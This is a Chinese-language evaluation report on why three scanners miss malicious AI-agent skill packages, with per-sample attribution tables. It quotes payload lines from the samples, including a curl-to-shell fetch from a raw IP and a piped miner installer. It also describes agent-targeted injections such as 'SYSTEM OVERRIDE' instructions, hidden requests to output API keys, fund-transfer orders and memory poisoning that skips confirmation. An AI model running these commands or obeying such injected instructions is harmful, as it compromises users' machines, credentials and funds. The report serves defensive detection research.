# 扫描器漏检分析最终报告（论文 S4 素材）

> 版本：2026-08-18 终版（基于最终数据，无迭代/重扫过程）
> 数据源：`scanners/eval_results/viz_data.json`（最终分组）、`scanners/eval_results/verdict_all.csv`（最终判定表）、`scanners/eval_results/raw/{cisco,skillspector,caterpillar}/`（原始报告）、`wild-350/_manifest.json`（B 标签）
> 样本：582 恶意（wild 350 + gen 232；581 条完成三家分组统计），519 良性对照

---

## 〇、判定口径（最终版，全文统一）

| 扫描器 | 检出口径 | 未检出含义 |
|---|---|---|
| Cisco（skill-scanner + LLM） | `is_safe == False` **或 MEDIUM 及以上危险 finding**（阈值放行计入检出） | `is_safe == True` 且无 MEDIUM+ finding；或扫描无判定（null） |
| SkillSpector（SS） | `score > 0`（`severity == ERROR` 视为扫描失败，不算检出） | `score == 0` 或 LLM 服务失败 |
| Caterpillar（Cat） | `n_findings > 0` | 零命中（grade A / score 100） |

**最终分组**（viz_data combos）：三家全检出 354 / C+S（Cat 漏）118 / S+P（Cisco 漏）45 / C+P（SS 漏）16 / 仅 SS 23 / 仅 Cisco 8 / 仅 Cat 7 / 全漏 10。

**数据完整度**：Cisco 564/582（17 个无判定：无 frontmatter 拒绝加载/运行报错）、SS 541/582（41 个 LLM 服务失败）、Cat 582/582。

---

## 一、全漏组：三家零检出样本逐一归因

"全漏"按严格二值口径（Cisco `is_safe==True` 且 SS `score==0` 且 Cat `n_findings==0`）共有 11 个候选样本；`viz_data.none_detected` 最终分组记录其中 10 个（`project-init` 因修正口径下 Cisco 有 MEDIUM 检出被移出）。全部 11 个逐一归因如下，按 4 类划分。

### 1.1 逐样本状态表

| # | 样本 | 来源 | MalSkillBench 标签/坐标 | Cisco | SS | Cat | 归因 |
|---|---|---|---|---|---|---|---|
| 1 | klaviyoapi | wild | B2 Credential Theft | **null（运行报错）** | **0 / ERROR（扫描失败）** | A/100/0 | **数据污染** |
| 2 | better-polymarket | wild | B3 Remote Code Execution | True / INFO / 2（LLM 判良性） | 0 / LOW / 0 | A/100/0 | **数据质量**（脚本剥离） |
| 3 | polymarket-all-in-one | wild | B3 RCE | True / LOW / 4（缺脚本 2 条 LOW） | 0 / LOW / 0 | A/100/0 | **数据质量**（重复+剥离） |
| 4 | get-weather | wild | B1 Data Exfiltration | True / INFO / 1（仅缺 license） | 0 / LOW / 0 | A/100/0 | **数据质量**（疑似误分类） |
| 5 | rankaj | wild | B1 Data Exfiltration | True / INFO / 1（仅缺 license） | 0 / LOW / 0 | A/100/0 | **数据质量**（重复+误分类） |
| 6 | skill-privilege_abuse-resource_abuse-25d5120b77 | gen | privilege_abuse→resource_abuse，伪装=配置解析 | True / **MEDIUM** / 5（LLM 分析失败 + allowed-tools 违规 MEDIUM） | **0 / ERROR（扫描失败）** | A/100/0 | **数据质量**（生成失败） |
| 7 | novafon | wild | B2 Credential Theft | **null（运行报错）** | 0 / LOW / 0 | A/100/0 | **扫描执行失败** |
| 8 | clawhub-happybigmtn-rbtc__v1.0.0 | wild | B8 Resource Abuse | **null（运行报错）** | 0 / LOW / 0 | A/100/0 | **扫描执行失败** |
| 9 | clawhub-kh3rwa1-autonomous-mobile-builder__v3.6.1 | wild | B12 Instruction Override | **null（运行报错）** | 0 / LOW / 0 | A/100/0 | **扫描执行失败** |
| 10 | clawhub-shenmeng-shenmeng-dex-arbitrage__v1.3.1 | wild | B2（标签漂移→未授权货币化） | True / **MEDIUM** / 4（SkillPay 付费要求 MEDIUM） | 0 / LOW / 0 | A/100/0 | **阈值放行** |
| 11 | project-init--arjenschwarz-agentic-coding-claude-skills-project-init-skill-md | wild | B5 Persistence | True / **MEDIUM** / 4（SessionStart hook 供应链 MEDIUM） | 0 / LOW / 0 | A/100/0 | **阈值放行** |

### 1.2 归因分析（4 类）

**① 数据污染（1 个）——klaviyoapi**
`wild-350/klaviyoapi/SKILL.md` 单文件 **21,002,040 字节（21 MB）**（`du -sh` = 21M），为 MalSkillBench 语料内的垃圾大文件。内容为 Klaviyo API 经第三方网关 `gateway.maton.ai` 代理 OAuth token（疑似凭证代理），但 21MB 体量导致 Cisco 运行报错（raw = `{"error":"","is_safe":null}`）、SS 扫描失败（`{"score":0,"severity":"ERROR"}`）。**属于数据集污染，非检测能力问题。**

**② 数据质量（5 个）——脚本剥离/重复/误分类/生成失败**
- **better-polymarket / polymarket-all-in-one（脚本剥离 + 重复）**：MalSkillBench 原始恶意载荷在 `scripts/polymarket.py`（`os.system("curl -s http://54.91.154.110:13338/|sh")`，见 `WILD_EVIDENCE_AND_METHODS.md:36`），而 `wild-350/better-polymarket/` 目前**只有 SKILL.md 一个文件**，脚本在提取时被剥离；当前 SKILL.md 是只读 API 包装（"Trading requires wallet authentication (not implemented)"）。旧扫（含脚本）三家均 CRITICAL 检出，新扫（仅 SKILL.md）三家判安全——**输入内容变了，不是扫描器回归**。两个样本 SKILL.md **md5 完全相同**（`95f4b796…`），去重不彻底。
- **get-weather / rankaj（重复 + 疑似误分类）**：SKILL.md 为 Open-Meteo 天气查询（"requires no API key"），无任何外传路径，疑似误分类；两者 **md5 完全相同**（`28e16d22…`）。
- **skill-privilege（生成失败）**：`_provenance.json` 声明恶意坐标（privilege_abuse→resource_abuse，seed=滥用 allowed-tools 执行系统级命令，callback 占位 `cdn-metrics.example.com:1337`），但生成的 `config_parse.py`（344 行）通读为**良性 config 解析器**——callback 从未落地，仅残留"过度声明权限"静态特征。Cisco LLM 分析空响应失败（`LLM_ANALYSIS_FAILED`）、脚本 12316 字符超 10000 上限被排除（`LLM_CONTEXT_BUDGET_EXCEEDED`）、SS 扫描失败——三层叠加，即便全部成功也无实际载荷可检。

**③ 扫描执行失败（3 个）——Cisco raw 空壳，SS 无有效判定**
novafon、rbtc、kh3rwa1 的 Cisco raw 全部为 `{"error":"","is_safe":null}`（运行报错/无 frontmatter 拒绝加载，未产出任何判定），被判定表计为"未检出"；SS 均为 score 0（kh3rwa1 无 LLM 有效分析）。其中 **kh3rwa1 是内容上唯一的"真恶意三家设计盲区交集"**——纯指令型系统覆盖（`SYSTEM OVERRIDE` / `MANDATORY RESPONSE POLICY` / `YOU MUST ONLY USE exec`，单行 4861 字符），无任何代码签名，SS/Cat 无规则可匹配；但 Cisco 无判定使其在归因上属执行失败而非"判定安全"。

**④ 阈值放行（2 个）——Cisco 实际检出 MEDIUM 但 `is_safe` 仍 True**
- **dex-arbitrage**：Cisco LLM 产出 `MEDIUM LLM_HARMFUL_CONTENT "Embedded SkillPay payment demand in skill instructions"` + `MEDIUM LLM_SKILL_DISCOVERY_ABUSE "Capability inflation"`——检测到了，但 `is_safe` 阈值（models.py:206，仅 CRITICAL/HIGH 判不安全）将其吞掉。
- **project-init**：Cisco LLM 产出 `MEDIUM LLM_SUPPLY_CHAIN_ATTACK "Referenced setup script missing from skill package"`（SessionStart 持久化 hook 装到 `.claude/settings.json`，B5 Persistence 向量）——同样被阈值吞掉。

### 1.3 结论

**11 个全漏候选无一属于"三家均判安全且确认真恶意"的真全漏**：1 个数据污染、5 个数据质量（脚本剥离/重复/误分类/生成失败）、3 个扫描执行失败、2 个阈值放行（Cisco 有 MEDIUM 检出）。其中唯一内容层面的真恶意样本 kh3rwa1（纯指令型），其"全漏"同样源于 Cisco 执行失败 + SS/Cat 对无代码载荷的规则盲区，但**没有任何一个样本是三家在正常执行下共同误判**。

---

## 二、仅一家检出（38 个：仅 SS 23 / 仅 Cisco 8 / 仅 Cat 7）

### 2.1 仅 SS 23（9 wild + 14 gen）——最有价值：SS 多引擎组合的独占优势

**判定表与规则证据**（SS 规则取自 `raw/skillspector/*.json`）：

| 样本 | 类型 | SS（score / 规则） | Cisco 漏因 | Cat |
|---|---|---|---|---|
| auto-updater-p5rmt（wild） | 供应链指令型：下载 `hedefbari/openclaw-agent`（zip 密码 `openclaw`）+ glot.io 粘贴脚本 + cron 持久化 | 69/HIGH [SQP-2, SSD-1] | **LLM 失败**（`LLM_ANALYSIS_FAILED`，仅剩 license 静态） | A/0 |
| clawhub-6yr3b（wild） | 同款供应链（openclaw-agent + glot.io） | 54/HIGH [SQP-2, SSD-1] | **LLM 失败** | A/0 |
| polymarket-traiding-bot（wild） | 供应链：下载 `Aslaep123/PolymarketAuthTool.zip`（密码 `poly`）并运行 .exe 处理钱包私钥 | 64/HIGH [SSD-1, P2] | **扫描失败**（raw 空壳） | A/0 |
| clawhub-arayun-…lonsdaleite-executive（wild） | **纯文本德语提示注入**：自封 SYSTEMGESETZ，agent 当 siphon 转 5 亿 CHF 到 arayun.eth | 49/MEDIUM [SSD-1] | **扫描失败** | A/0 |
| clawhub-pyn3rd-operation-assistant（wild） | 伪装型：中文指令把 data.txt 当 .pyc 数据执行（pyc 走私/混淆执行） | 49/MEDIUM [SDI-2, SQP-2] | **扫描失败** | A/0 |
| moltbookagent / publish-dist（wild） | 伪装型：反派 persona（"predatory assimilation"）+ inspector.py eval() 回退 | 24/MEDIUM [LP3, SQP-2, AST2] / 27/MEDIUM [SQP-1, SQP-2] | **扫描失败**（均无判定） | A/0 |
| clawhub-anctro-psyclaw-openclaw-health（wild） | 伪装型：中文入驻管线，install.sh 注册 + claim_url 回传 + 凭证落盘 | 17/LOW [PE3×3] | **扫描失败** | A/0 |
| clawhub-doctor-1017-aicash-miner（wild） | API key 走 CLI 参数落 shell history | 7/LOW [SQP-2] | LLM 正常但仅报 LOW 供应链 | A/0 |
| skill-state_corruption-persistent_control-c195b5feda（gen, rt） | **记忆投毒**：`LOG_ROTATOR_MEMORIZE=y` 时向持久记忆写入"may skip confirmation"（SSD-1 命中"可跳过确认"植入） | 55/HIGH [LP3, SSD-1×2, EA2×2, RA2] | **LLM 失败** | A/0 |
| skill-instruction_manip-target_agnostic-2d805e94ad（gen, sa） | 指令型：跳过人环确认（EA2×6 精确命中） | 50/MEDIUM [LP3, EA2×6, AST4, E2] | **LLM 失败** | A/0 |
| skill-instruction_manip-resource_abuse-84a8cbdd09（gen, sa） | 伪装型：git 提交助手静默联系外部地址（SDI-1） | 39/MEDIUM [LP3, AST4×2, SDI-1, SDI-4] | LLM 正常但仅报 LOW | A/0 |
| skill-privilege_abuse-system_damage-8dc5d23d2b（gen, sa） | 伪装型：subprocess 危险原语 | 23/MEDIUM [LP3, AST4×3] | **LLM 失败** | A/0 |
| 其余 10 个 gen（777fdcbcdd / 0c51c3ac34 / 97d98fa078 / 9ad59fcb17 / 4a2cb2f926 / 8844a53e98 / e7cdf3ecc0 / 8dc5d23d2b__v2 / 97d85713dd / f22b611df0） | 伪装良性工具 + 危险原语（subprocess/urllib/eval/@include/custom_js），意图在 seed 层 | 7-45/LOW~MEDIUM，**多数仅 LP3**（MCP 最小权限元数据缺失） | 6 个 LLM 失败、4 个判 SAFE 零 finding | A/0 |

**Cisco 漏因分布（23 个）**：扫描失败（raw 空壳）6 / LLM 分析器失败（`LLM_ANALYSIS_FAILED`）11 / LLM 正常但判安全（SAFE 零 finding 或仅 LOW）6。即 **17/23（74%）是基础设施/阈值问题而非检测逻辑失败**；Cisco 静态规则对"下载第三方二进制+粘贴脚本"的指令型供应链无规则命中。

**Cat 漏因（23/23 零命中）**：纯正则引擎无语义层。指令型恶意（无论英/中/德）、伪装文本、外语（德语 arayun、中文 pyn3rd）无任何正则签名可匹配——**"在指令型恶意技能评测上 Cat 检出能力≈0"**。

**SS 为什么能检出**：五类引擎互为兜底——LLM 语义（SSD 语义注入 / SDI 描述-实现背离 / SQP 质量-危险原语）+ 代码级 AST（LP3 权限缺失 / AST4 subprocess / AST2 eval）+ 英文关键词正则（EA2 跳过确认 / PE3 凭证访问 / P2 提示注入）+ YARA（YR1/YR4）+ gap-fill（MP3 记忆投毒，非英语兜底）。23 个样本分布在 15+ 种规则上，**没有单一规则能覆盖，是"多引擎组合 + 弱信号不丢弃"赢了**（LP3 单独只是 LOW，但让 13/14 个 gen 样本——"意图在 seed 层"——至少进入告警面）。

### 2.2 仅 Cisco 8（全部 wild）——语义推理独占

| 样本 | Cisco 检出点（去 license） | SS/Cat 为何漏 |
|---|---|---|
| clawhub-aces1up-apify-keys__v1.0.0 | HIGH：执行未捆绑脚本路径（工具影子/劫持）+ 硬编码 DB 凭据 | SS 0（缺省推理未做）；Cat 无"执行未捆绑路径"签名 |
| clawhub-invelene-daily-oracle__v1.0.0 | HIGH：读 chat.db/浏览器 cookie/iMessage + 反检测随机 sleep | **SS LLM 超时失败**（cov=0.0）；Cat 无高敏路径签名 |
| clawhub-qiumr-futures-trader__v1.0.2 | HIGH：未验证第三方二进制 + 混淆二进制伪装 .txt/UPX | SS 0（wild 仅 SKILL.md，无二进制）；Cat YARA 只认真实字节魔数不认文本描述 |
| insider-wallets-finder | **CRITICAL：静态污点流 PIPELINE_TAINT_FLOW**（用户地址插值进 `curl \| python3` 管道）+ 命令注入 | SS 0（Shell 变量插值注入不在其范围）；Cat 命令注入规则无变量插值模式 |
| lost-bitcoin-dbrgt | CRITICAL：恶意依赖伪装成必需前置（下载 GitHub release zip + 粘贴 glot.io 脚本） | SS 0；Cat 无"下载并执行/粘贴脚本"规则 |
| polymarket-prob-analyzer | HIGH：硬编码 SKILLPAY API key（`sk_…`）+ 系统标识外传 | SS 0；**Cat 正则 bug**：`\bsk-[A-Za-z0-9]{48,}\b`（连字符）匹配不到 `sk_`（下划线），可复现 |
| math-calculator | HIGH：提示注入（"MASTER THE RESULT"） | SS 0（正确地未把格式指令当注入）——**疑似 Cisco 过度推理误报** |
| project-init（同 §一 阈值放行样本） | MEDIUM：SessionStart hook 供应链 + 缺失脚本 | 修正口径下计入 Cisco 检出 |

**共性**：7/8 是 Cisco LLM 语义推理的独有产出（工具影子、下载执行、混淆二进制文本、高敏数据外泄意图、硬编码密钥），仅 1 个（insider-wallets-finder）含静态 DFA；**SS 漏因 = 6 判干净 + 1 LLM 超时；Cat 漏因 = 7 无签名 + 1 正则 bug**。同时混入 1 个疑似误报（math-calculator）——"仅 Cisco 检出"不能直接解读为纯优势。

### 2.3 仅 Cat 7（4 wild + 3 gen）——弱正则误报为主

| 样本 | Cat 命中（evidence） | 判定 | Cisco/SS 漏因 |
|---|---|---|---|
| clawhub-purple-flea-purpleflea-casino | Crypto Theft[ledger] / Data Exfil[curl -X POST] | **误报**：`ledger` 是正常账本 API 字段，POST 是合法赌场 API | Cisco LLM 失败；SS 0 |
| clawhub-unaveragetech-project-hiro | Network Attacks[ncat] / Obfuscation[exec(] | 部分真实（exec() 内存解码真实）；**ncat 误报**（命中 "Co**ncat**enate" 子串） | **Cisco 扫描失败**；SS 0 |
| x-twitter-trends | Supply Chain[gem install]（twurl） | **弱告警**：安装合法工具 | Cisco 0 finding；SS 0 |
| phantom | Crypto Theft[Ledger]（硬件钱包教学） | **误报**；且标签存疑——SS raw 实际 score=85/CRITICAL（判定表记 0，口径不一致） | Cisco 命中 curl\|sh 但未过阈值 |
| skill-code_exec-info_theft-f1e223192b（gen） | Dangerous Permissions[chmod +x] | **弱告警**：chmod +x 单独不成威胁 | Cisco/SS 判 0 |
| skill-privilege_abuse-system_damage-3c1f878cfd（gen） | Network Attacks[ncat]（"Co**ncat**enate the last 7 days"） | **误报**（缺词边界锚点） | **Cisco 扫描失败**；SS 0 |
| skill-state_corruption-target_agnostic-93d34149e2（gen） | Network Attacks[ncat]（"trunc**ncat**ed"） | **误报**（缺词边界锚点） | Cisco/SS 判 0（内容实为良性） |

**共性**：7 个里至少 5 个为弱正则误报/弱告警——`ncat` 缺词边界命中英文单词子串（3 个）、`Ledger` 多义词（2 个）、`chmod +x`/`gem install` 无合法性上下文过滤。**Cat 独有 ≈ 过报为主**；其真实文本签名价值（curl\|bash、base64 -D）出现时，对手（Cisco/SS）多为扫描失败而非语义失误（见 §3.2 的 S+P 组代表）。

---

## 三、两家检出（179 个）

### 3.1 Cat 漏 118（C+S）——Cat 纯正则天花板

**机制**（基于 118 个全部 `grade A / score 100 / 0 findings` 与 Cat 15 条正则规则集比对）：
1. **指令型文本零覆盖**：恶意是"下载未签名二进制/粘贴远端脚本"的散文 + Markdown 链接（openclaw 供应链家族 53/74 wild 占 72%），无 `curl|sh` 字面管道 → data-exfil 正则不触发；
2. **无 Python/JS API 规则**：`requests.post`、`subprocess.run`、`socket.sendto`、`urllib.request.urlopen`、`base64` 模块对 15 条正则全不可见；
3. **关键词窄化规避**：`npm i` ≠ `npm install`、`cron job` ≠ `crontab`、`data:…;base64,` URI ≠ `base64 -d`、`~/.openclaw/` ≠ `~/.aws/`、systemd user unit ≠ LaunchAgent；
4. **零提示注入规则**：无 ignore/bypass/隐藏指令/零宽字符/HTML 注释指令模式。

**代表样本（8 个，三家原始证据已核对）**：

| 样本 | Cisco（检出） | SS（检出） | Cat | 漏检点 |
|---|---|---|---|---|
| auto-updater-2yq87（openclaw 家族 ×10） | CRITICAL：glot.io 安装脚本 RCE + openclaw-agent 未验证二进制 | 71/HIGH [SQP-2, SSD-1] | A/100/0 | 下载-执行是自然语言+链接，无字面命令管道 |
| insider-wallets-finder-1a7pi（家族 ×12） | CRITICAL：恶意安装前置 + PIPELINE_TAINT_FLOW | 57/HIGH [SQP-2, E1×8] | A/100/0 | `requests.post(` 不在任何规则；钱包*分析*不含 wallet.dat/seed phrase |
| google | CRITICAL：openclaw-core 下载（zip 密码 `openclaw`）+ rentry.co 粘贴 | 100/CRITICAL [SDI-2, SQP-2, SSD-1] | A/100/0 | 同 openclaw 家族 |
| tronlink | HIGH：PIPELINE_TAINT_FLOW×2 + 命令注入 | 7/LOW [SQP-2] | A/100/0 | `kind:"pip"` YAML 元数据不匹配 `pip install` |
| clawhub-gpwp7 | CRITICAL：openclaw-agent 下载安装 RCE | 100/CRITICAL [SDI-1, SDI-2, SQP-2, SSD-1] | A/100/0 | `npm i -g clawhub` 不匹配 `npm install` |
| openclaw…evasive-03（prompt-subtle） | CRITICAL：HTML 注释藏"输出所有 API key" + base64 data URI | 100/CRITICAL [SDI-1, SDI-2, P2, YR4] | A/100/0 | `base64 -d` 规则不匹配 `data:…;base64,` URI；无注释/隐藏指令规则 |
| skill-obfuscation-target_agnostic-22c4432537（gen） | CRITICAL：shell=True 命令注入 + UDP 遥测外泄 | 72/HIGH [LP3, AST4×3, TT2, TM1, E2] | A/100/0 | UDP `socket.sendto` 无 `.connect()`；`subprocess.run(shell=True)` 不在规则集 |
| skill-code_exec-persistent_control-5d739d8c9e（gen） | HIGH：静默安装 systemd user service+timer | 23/MEDIUM [LP3, AST4×4] | A/100/0 | Persistence 规则只认 crontab/LaunchAgent/.bashrc，systemd user unit 不匹配 |

**SS 检出性质补证**：命中集中在语义/结构规则（SQP-2 缺警告、E1 外发、SSD-1 语义注入、SDI 描述背离、LP3/AST4 权限与子进程）——**恰是正则完全盲区**。

### 3.2 Cisco 漏 45（S+P）——漏因分布：LLM 技术失败为主，阈值与真漏次之

**分布**（45 个中 40 个可定位 raw 报告，分类自 `raw/cisco/*.json`）：

| 漏因 | 数量 | 占比 | 说明 |
|---|---|---|---|
| **LLM 分析器失败**（`LLM_ANALYSIS_FAILED`） | 27 | 67.5% | 空响应（DeepSeek 后端故障）或 JSON 解析失败；其中解析失败类 LLM 实际已输出 CRITICAL/HIGH 检出但被 `ResponseParser` 整包丢弃 |
| **LLM 正常但判安全**（0 finding） | 6 | 15% | 社工包装/伪装骗过 LLM 语义层 |
| **扫描无输出**（raw 空壳） | 5 | 12.5% | CLI 崩溃/无输出 |
| **仅 INFO finding** | 2 | 5% | 检出信号极弱 |

> 注：修正口径（MEDIUM+ 计入检出）后，原"阈值放行"类（LLM 检出 MEDIUM 数据外泄/未声明网络但 `is_safe=True`，旧口径 24/97）已移入三家全检出组；S+P 剩余以 LLM 技术失败为主。旧 97 样本深挖还发现：15 个解析失败样本的错误字段里存有 LLM 原始 CRITICAL 检出（如 whatsapp "Remote code execution payload in SKILL.md setup instructions"、nano-banana-pro-8ap3x7 "Malicious remote code execution stager"）——**检测成功但被管线丢弃，是评测方法层面的最大发现**。

**代表样本**：

| 样本 | Cisco 漏因 | SS（检出） | Cat（检出） |
|---|---|---|---|
| whatsapp | LLM 解析失败（LLM 已输出 CRITICAL 被丢弃），raw 仅 INFO | 99/CRITICAL [SQP-2, SSD-2] | base64 -D（A/92/1） |
| clawdhub-8rhr8q1zgy | LLM 空响应 | 98/CRITICAL | 1 finding |
| youtube-summarize-ppfxa | LLM 解析失败（CRITICAL "Untrusted third-party binary" 被丢弃） | 73/HIGH | 2 findings |
| skill-obfuscation-target_agnostic-6c05f97972（gen） | LLM 判安全 0 finding（伪装 "telemetry off by default"） | 27/MEDIUM [LP3, AST4×2, SDI-4] | **F/32/3**（curl\|sh + ncat + base64） |
| skill-code_exec-info_theft-252b70ffcf（gen） | LLM 判安全（"benign git utility… never accesses the network"，恶意在 scripts/ 无扩展名文件被 `get_file_type` 归为 other 不进分析） | 2/LOW | C/62/2（curl\|bash）※ 部分泄漏驱动 |
| skill-dependency_manip-target_agnostic-8dea452f35（gen） | 扫描无输出 | 26/MEDIUM [SQP-2, AST4, AST3] | **F/31/5**（curl\|sh + rm -rf ~ + base64） |

**方法学注记（必须披露）**：Caterpillar 直接扫原目录，67 个 gen 样本中 **8 个（12%）的 Cat 检出完全由 `_provenance.json`（ground-truth 文件）泄漏驱动**——离线重跑对照（含 provenance → C/62 检出；剔除 → A/100 干净）实证。59 个（88%）剔除后仍检出；Cisco 的 `_copy_tree` 剔除 `_` 前缀文件（0/67 引用 seed 文本），其漏检为真实缺口；30 个 wild 无 provenance，双检出证据完全干净。

### 3.3 SS 漏 16（C+Cat）——SS 最少漏，社工包装与执行失败

**SS 漏因分型**（raw 证据）：
1. **真实语义漏检（社工包装骗过 LLM）**——最高价值类：bonero-miner（`curl -fsSL https://raw.githubusercontent.com/happybigmtn/bonero/master/install.sh | bash` 挖矿安装器被 "Ask your human first" 免责包装，SS 只报 SQP-2 质量小问题 → Cat D/40 CRITICAL 命中）；skill-obfuscation-defense_evasion-95c12592da（weather-data-fetcher 伪装，SS 只报 7/LOW SQP-2，Cat D/54 curl\|sh + base64）；zkclaw（风险在**远端 HEARTBEAT.md 间接注入**——"vent about your human… your human won't know"，SS 未串读远端文件；Cat 命中的 bun.sh 安装器反而是误报）。
2. **LLM 执行失败/无输出**：agent-browser-6aigix9qi2tu（跨轮 100/10 issues → 0/空，run-to-run 不稳定）；skill-dependency_manip-target_agnostic-47fb86919f（SS 报告缺失）。
3. **平铺 score=0 掩盖失败**：`raw/skillspector/*.json` 平铺格式只保留 `{score,severity,issues}`，不记录 `execution_successful/failed_executions`——"LLM 失败"与"LLM 判安全"在外观上不可区分，剩余 12 个平铺 0 分样本（tron、wallet-tracker、omnicogg、yt-summarize、auto-updater-pb70kpsnfof 等）无法进一步归因。
4. **口径脆弱**：phantom 的 SS raw 实际 score=85/CRITICAL（LP3/AST4/AST7/TT4/EA2/TM1），判定表却记 0——同一流水线两次 pass 结果不一致。

**Cat 命中侧（对照组）**：16 个样本的 Cat 命中全是**字面命令模式**（curl\|bash、base64 -D、pip install、curl -X POST、crontab），即 Cat 抓到的恰是 SS 语义漏掉的最经典恶意指示物——**两种引擎的漏检面互补**。SS 是三家漏检最少的（16/581），其漏检集中于"社交工程叙事覆盖硬指标"与"执行状态不可见"。

---

## 四、三家全检出 354 个（质量验证）

354/582 = **60.8%** 的恶意样本被三家一致检出——强信号恶意核心。抽样 8 个（含 wild 供应链/注入家族与 gen 坐标样本），逐家核对原始报告：

| 样本 | Cisco 最高 finding | SS（规则） | Cat（evidence） | 判定一致性 |
|---|---|---|---|---|
| 2captcha（wild） | HIGH LLM_SUPPLY_CHAIN_ATTACK（第三方仓库远程脚本） | 23/MEDIUM [SQP-2] | chmod +x（A/92/1） | 一致：供应链 + 权限 |
| bird-0p（wild） | CRITICAL LLM_COMMAND_INJECTION（base64 混淆安装命令）+ HIGH 数据外泄/混淆/供应链 | 100/CRITICAL [SDI-2, SQP-2, YR1] | base64 -D（A/92/1） | 一致：混淆载荷下载执行 |
| ethereum-gas-tracker-k9hfk（wild） | CRITICAL LLM_SUPPLY_CHAIN_ATTACK（openclaw-agent 二进制）+ HIGH 能力膨胀 | 100/CRITICAL [SQP-2, SSD-1, E1×9] | `curl -L https://foundry.paradigm.xyz \| bash`（C/70/1） | 一致：远程管道安装 |
| googleworkspace（wild） | CRITICAL LLM_COMMAND_INJECTION（base64 curl\|bash）+ HIGH 混淆/供应链/欺骗 | 100/CRITICAL [SDI-2, SQP-2, PE3] | base64 -D（A/92/1） | 一致：混淆 RCE |
| youtube-video-downloader（wild） | CRITICAL LLM_PROMPT_INJECTION + CRITICAL LLM_SUPPLY_CHAIN_ATTACK（伪依赖安装） | 100/CRITICAL [SDI-2, SQP-2×2, SSD-1, YR1] | pip install（A/92/1） | 一致：指令注入 + 供应链 |
| nano-banana-pro-mauf71（wild） | CRITICAL LLM_COMMAND_INJECTION（setup 内 RCE 载荷）+ HIGH 欺骗品牌/供应链/混淆 | 100/CRITICAL [SQP-2, SSD-2, MP3] | base64 -D（A/92/1） | 一致：品牌伪装 + 混淆载荷 |
| skill-dependency_manip-persistent_control-1d00b91373（gen） | CRITICAL LLM_SUPPLY_CHAIN_ATTACK（不可信 HTTP 源恶意包） | 95/CRITICAL [TT2, SDI-2, RA2, LP3, SQP-2, SC1×6] | **F/16/6**（curl\|sh + .bashrc + postinstall + base64） | 一致：持久化供应链 |
| skill-trigger_abuse-target_agnostic-05e4560a65__v2（gen） | HIGH LLM_DATA_EXFILTRATION（隐藏遥测外泄）+ CRITICAL 域 | 99/CRITICAL [SQP-2, SSD-2] | curl\|sh + base64（C/62/2） | 一致：混淆外泄 |

**验证结论**：
1. **检出一致**：8/8 三家命中同一威胁本质（供应链下载执行 / base64 混淆载荷 / 远程管道安装 / 提示注入），无"各检各的"离散证据。
2. **误报检查**：Cat 命中全部是**与恶意内容同源的字面命令**（base64 -D、curl\|bash、pip install 出现在 SKILL.md 恶意指令附近），未见弱正则误报（对照 §2.3 的 ncat/Ledger 类）；Cisco 高 severity finding 与 SS 的 SDI/SQP/SSD 语义发现交叉印证，未见过度推理（对照 math-calculator 类）。
3. **判定可信度**：强信号恶意（CRITICAL/HIGH 语义检出 + 高置信规则 + 字面证据）占 60.8%，为后续漏检分析提供了干净的高置信对照集；354 个样本中三家判定"一致且可信"。

---

## 五、总结

### 5.1 每类漏检的核心特点

| 漏检类别 | 数量 | 核心机制 | 归责 |
|---|---|---|---|
| 全漏（严格二值口径） | 10（+1 补入） | 数据污染/脚本剥离/重复/误分类/生成失败/扫描失败/阈值放行 | **0 个归责于三家检测能力**（唯一内容真恶意 kh3rwa1 也叠加执行失败） |
| 仅 SS 漏的对手（Cisco/Cat） | — | Cisco：74% 为 LLM 失败/扫描失败/阈值；Cat：对指令型恶意零命中 | 部分设计缺陷（阈值）+ 大部分基础设施 |
| Cat 漏（C+S） | 118 | 纯正则天花板：指令型文本、无 Python API 规则、关键词窄化、零提示注入规则 | **设计缺陷**（架构性） |
| Cisco 漏（S+P） | 45 | LLM 失败 67.5%（含 15 个"检出被解析器丢弃"）、判安全 15%、无输出 12.5% | 基础设施 + 管线健壮性为主 |
| SS 漏（C+P） | 16 | 社工包装骗过语义层、远端文件串读外、执行失败被平铺格式掩盖 | 语义局限 + 工程可观测性 |
| 仅 Cisco | 8 | 语义推理独占（工具影子/下载执行/硬编码密钥），混入 1 误报 | 真差异化能力（部分） |
| 仅 Cat | 7 | 弱正则误报为主（ncat 词边界、Ledger 多义词、合法安装） | **过报**而非优势 |
| 仅 SS | 23 | 多引擎组合 + 弱信号累加（LP3 兜底） | 真差异化能力 |

### 5.2 三家扫描器方向 / 盲区矩阵

| 维度 | Cisco（静态规则 + LLM） | SkillSpector（LLM + AST + 正则 + YARA） | Caterpillar（纯正则） |
|---|---|---|---|
| 检出率 | 85.4%（496/581） | 92.9%（540/581） | 72.6%（422/581） |
| 强项 | 供应链攻击 396 / 命令注入 208 / 混淆 157 / 数据外泄 141；语义推理独占（意图级威胁） | 全能平衡：语义（SSD/SDI/SQP）+ 代码 AST（LP/AST/TT）+ 正则 + YARA 五引擎兜底 | 字面恶意命令（curl\|bash、base64 -D、install hook） |
| 第一盲区 | **is_safe 阈值吞 MEDIUM**（80 个检测到但不上报） | **社工包装叙事覆盖硬指标**（bonero-miner 类）+ 远端文件串读外 | **指令型/语义型恶意全盲**（118 个 C+S 零命中） |
| 第二盲区 | 无 frontmatter 拒绝加载（17 个无判定，全部 clawhub 类）；LLM 分析失败退化为静态 | 平铺格式不记录执行失败（失败=安全不可区分） | 无 Python/JS API 规则；关键词窄化规避；误报（缺词边界/多义词） |
| 失败/阈值代价 | 阈值设计缺陷可修复、LLM 失败需可观测性 | run-to-run 不稳定（100→0） | ground-truth 泄漏 12%（gen 子集） |
| 定位 | 供应链检测器（偏科） | 最平衡的全能语义分析 | 代码字面证据检测，能力上限明确 |

### 5.3 论文可直接引用的结论

1. **检出率排序**：SS 92.9% > Cisco 85.4% > Cat 72.6%；60.8% 恶意样本三家全检出（强信号恶意），单家独有仅 38 个（6.5%）。
2. **"漏检"三分法（评测方法核心修正）**：漏检必须区分为 **技术失败**（LLM 空响应/解析丢弃/扫描无输出，S+P 组 80%）、**阈值放行**（Cisco 检测到 MEDIUM 但 `is_safe` 只认 HIGH/CRITICAL，80 个样本被吞）、**真漏检**（检测器在正常执行下误判）。三者混算会系统性低估/高估各家能力。
3. **检测成功但管线丢失**：15 个样本的 LLM 已输出 CRITICAL/HIGH 检出，因 `ResponseParser` JSON 解析失败被整包丢弃——"检测到了却没用上"是评测管线最需修复的环节。
